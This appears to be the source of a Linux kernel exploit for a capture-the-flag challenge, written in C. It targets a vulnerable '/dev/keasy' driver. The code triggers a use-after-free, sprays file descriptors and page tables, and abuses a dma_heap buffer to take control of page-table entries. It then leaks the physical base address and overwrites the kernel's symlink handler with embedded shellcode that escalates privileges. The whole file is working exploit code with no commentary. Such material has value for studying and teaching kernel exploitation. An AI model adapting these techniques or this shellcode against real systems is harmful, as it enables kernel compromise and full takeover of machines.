#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/mman.h>

#define SPRAY_COUNT_1 0x100
#define SPRAY_COUNT_2 0x1000


struct dma_heap_allocation_data {
    unsigned long long len;
    unsigned int fd;
    unsigned int fd_flags;
    unsigned long long heap_flags;
};


void init_cpu(void){
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
        perror("[-] sched_setaffinity");
        exit(EXIT_FAILURE);    
    }
}

#define BYTES_PER_LINE 16
void hexdump(const unsigned char *buf, size_t len) {
    for (size_t i = 0; i < len; i++) {
        if (i % BYTES_PER_LINE == 0) {
            printf("%06zx: ", i);
        }

        printf("%02x ", buf[i]);

        if ((i + 1) % BYTES_PER_LINE == 0 || i == len - 1) {
            printf("\n");
        }
    }
}

unsigned long user_cs, user_ss, user_rsp, user_rflags;
static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

static void win() {
    puts("[+] win > _ <");
    char buf[0x100];
    int fd = open("/dev/sda", O_RDONLY);
    read(fd, buf, 0x100);
    write(1, buf, 0x100);
}

int main(){
    init_cpu();
    save_state();
    
    int fd = open("/dev/keasy",O_RDWR);
    if(fd==-1){
        puts("open error");
        exit(-1);
    }

    int fd2 = open("/dev/dma_heap/system",O_RDWR);
    if(fd2==-1){
        puts("open error");
        exit(-1);
    }

    char *spray_map[SPRAY_COUNT_2*2] = {0, };
    puts("[+] Spraying mmap");
    for(int i=0;i<SPRAY_COUNT_2*2;i++){
        spray_map[i] = mmap((void*)(0x13370000UL + i*0x10000UL), 0x8000, PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_SHARED, -1, 0);
        if(spray_map[i]==MAP_FAILED){
            puts("spray mmap error");
            exit(-1);
        }
    }

    int spray_fd[SPRAY_COUNT_1*2] = {0, };
    puts("[+] Spraying fd 1");
    for(int i=0;i<SPRAY_COUNT_1;i++){
        spray_fd[i] = open("/jail", O_RDONLY);
        if(spray_fd[i]==-1){
            puts("spray fd 1 error");
            exit(-1);
        }
    }

    puts("[+] Trigger UAF");
    int uaf_fd = spray_fd[SPRAY_COUNT_1-1] + 1;
    ioctl(fd, 0x0, 0x0);
    printf("[+] uaf_fd : %d\n", uaf_fd);

    puts("[+] Spraying fd 2");
    for(int i=SPRAY_COUNT_1;i<SPRAY_COUNT_1*2;i++){
        spray_fd[i] = open("/jail", O_RDONLY);
        if(spray_fd[i]==-1){
            puts("spray fd 2 error");
            exit(-1);
        }
    }

    puts("[+] close sprayed fd");
    for(int i=0;i<SPRAY_COUNT_1*2;i++){
        close(spray_fd[i]);
    }

    puts("[+] Spraying PTE 1");
    for(int i=0;i<SPRAY_COUNT_2;i++){
        for(int ii=0;ii<8;ii++){
            spray_map[i][0x1000*ii] = '0' + ii;
        }
    }

    struct dma_heap_allocation_data data;
    data.len = 0x1000;
    data.fd_flags = O_RDWR;
    data.heap_flags = 0;
    data.fd = 0;
    if (ioctl(fd2, 0xc0184800, &data) < 0){
        puts("ioctl failed");
        exit(-1);
    }
    printf("[+] dma_buf_fd: %d\n", data.fd);

    puts("[+] Spraying PTE 2");
    for(int i=SPRAY_COUNT_2;i<SPRAY_COUNT_2*2;i++){
        for(int ii=0;ii<8;ii++){
            spray_map[i][0x1000*ii] = '0' + ii;
        }
    }

    puts("[+] Increase file->f_count");
    for (int i=0;i<0x1000; i++){
        if(dup(uaf_fd)==-1){
            puts("dup failed");
            exit(-1);
        }
    }

    puts("[+] Searching Overlapped PTE->Entry[7]");
    void *overlapped_entry = 0;
    for(int i=0;i<SPRAY_COUNT_2*2;i++){
        if(spray_map[i][0x1000*7] != ('0' + 7)){
            overlapped_entry = &(spray_map[i][0x1000*7]);
            break;
        }
    }
    printf("[+] Overlapped PTE->Entry[7] : %p\n", overlapped_entry);

    puts("[+] Overlapped PTE->Entry[7] = dma_buf");
    munmap(overlapped_entry, 0x1000);
    char *dma_buf = mmap(overlapped_entry, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, data.fd, 0);
    if(dma_buf==MAP_FAILED){
        puts("dma_buf mmap error");
        exit(-1);
    }
    dma_buf[0] = '0';

    puts("[+] Increase file->f_count");
    for (int i=0;i<0x1000; i++){
        if(dup(uaf_fd)==-1){
            puts("dup failed");
            exit(-1);
        }
    }

    puts("[+] Leak Physical Address Base");
    *(unsigned long long*)dma_buf = 0x8000000000000067 + 0x09c000;
    char *target_pte = 0;
    for(int i=0;i<SPRAY_COUNT_2*2;i++){
        if(*(unsigned long long*)spray_map[i] > 0xffff){
            target_pte = &(spray_map[i][0]);
            break;
        }
    }

    printf("[+] Page table leak: 0x%lx\n", *(uint64_t*)target_pte);
    long long unsigned physical_base = ((*(long long unsigned*)target_pte) & ~0xfff) - 0x1c04000;
    printf("[+] physical_base : %p\n", (void*)physical_base);

    puts("[+] Overwrite Kernel Function");
    long long unsigned symlink_addr = physical_base + 0x24d4c0;
    *(unsigned long long*)dma_buf = 0x8000000000000067 + (symlink_addr&~0xfff);
    printf("[+] Page table leak: 0x%llx\n", *(unsigned long long*)dma_buf);

    char shellcode[] = {0xf3, 0x0f, 0x1e, 0xfa, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5f, 0x49, 0x81, 0xef, 0xc9, 0xd4, 0x24, 0x00, 0x49, 0x8d, 0xbf, 0xd8, 0x5e, 0x44, 0x01, 0x49, 0x8d, 0x87, 0x20, 0xe6, 0x0a, 0x00, 0xff, 0xd0, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x49, 0x8d, 0x87, 0x50, 0x37, 0x0a, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc7, 0x49, 0x8d, 0xb7, 0xe0, 0x5c, 0x44, 0x01, 0x49, 0x8d, 0x87, 0x40, 0xc1, 0x0a, 0x00, 0xff, 0xd0, 0x49, 0x8d, 0xbf, 0x48, 0x82, 0x53, 0x01, 0x49, 0x8d, 0x87, 0x90, 0xf8, 0x27, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc3, 0x48, 0xbf, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x49, 0x8d, 0x87, 0x50, 0x37, 0x0a, 0x00, 0xff, 0xd0, 0x48, 0x89, 0x98, 0x40, 0x07, 0x00, 0x00, 0x31, 0xc0, 0x48, 0x89, 0x04, 0x24, 0x48, 0x89, 0x44, 0x24, 0x08, 0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48, 0xb8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x48, 0x89, 0x44, 0x24, 0x18, 0x48, 0xb8, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0xb8, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0xb8, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x48, 0x89, 0x44, 0x24, 0x30, 0x49, 0x8d, 0x87, 0x41, 0x0f, 0xc0, 0x00, 0xff, 0xe0, 0xcc};
    void *p;
    p = memmem(shellcode, sizeof(shellcode), "\x11\x11\x11\x11\x11\x11\x11\x11", 8);
    *(size_t*)p = getpid();
    p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
    *(size_t*)p = (size_t)&win;
    p = memmem(shellcode, sizeof(shellcode), "\x33\x33\x33\x33\x33\x33\x33\x33", 8);
    *(size_t*)p = user_cs;
    p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44", 8);
    *(size_t*)p = user_rflags;
    p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55", 8);
    *(size_t*)p = user_rsp;
    p = memmem(shellcode, sizeof(shellcode), "\x66\x66\x66\x66\x66\x66\x66\x66", 8);
    *(size_t*)p = user_ss;

    memcpy(target_pte+(symlink_addr&0xfff),shellcode,sizeof(shellcode));

    puts("[+] Execute evil func!!");
    symlink("/jail/x", "/jail");

    
    return 0;
}
